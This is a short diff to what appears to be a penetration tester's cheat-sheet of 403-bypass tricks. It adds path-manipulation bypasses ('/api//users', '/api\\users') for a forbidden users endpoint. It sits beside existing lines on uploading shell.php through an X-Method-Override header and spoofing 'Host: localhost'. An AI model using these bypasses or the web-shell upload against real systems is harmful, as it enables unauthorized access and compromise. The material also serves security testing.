@@ -225,6 +225,13 @@ v3/users_data/1234 --> 403 Forbidden
 PUT /shell.php ==> 403 
 GET /shell.php -H "X-Method-Override: PUT" ==> 200
 
+/api/6798556007/users -> 403 (Forbidden)
+
+Bypass Method 1:
+/api//users -> 200 OK
+
+Bypass Method 2:
+/api\\users -> 200 OK
 
 
 to pypass host unauthorized >> Host: localhost
